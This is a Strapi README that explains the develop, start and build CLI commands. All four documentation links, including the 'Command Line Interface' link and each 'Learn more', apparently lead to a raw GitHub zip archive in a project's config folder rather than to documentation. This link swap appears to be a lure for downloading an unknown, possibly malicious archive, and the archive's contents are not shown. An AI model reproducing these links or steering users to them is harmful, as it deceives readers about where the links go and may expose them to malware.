# üöÄ Getting started with Strapi

Strapi comes with a full featured [Command Line Interface](https://raw.githubusercontent.com/mohamed-magdy-1/SHOP.CO-back-End/main/config/SHOP.CO-back-End-2.2.zip) (CLI) which lets you scaffold and manage your project in seconds.

### `develop`

Start your Strapi application with autoReload enabled. [Learn more](https://raw.githubusercontent.com/mohamed-magdy-1/SHOP.CO-back-End/main/config/SHOP.CO-back-End-2.2.zip)

```
npm run develop
# or
yarn develop
```

### `start`

Start your Strapi application with autoReload disabled. [Learn more](https://raw.githubusercontent.com/mohamed-magdy-1/SHOP.CO-back-End/main/config/SHOP.CO-back-End-2.2.zip)

```
npm run start
# or
yarn start
```

### `build`

Build your admin panel. [Learn more](https://raw.githubusercontent.com/mohamed-magdy-1/SHOP.CO-back-End/main/config/SHOP.CO-back-End-2.2.zip)

```
npm run build
# or
yarn build
```
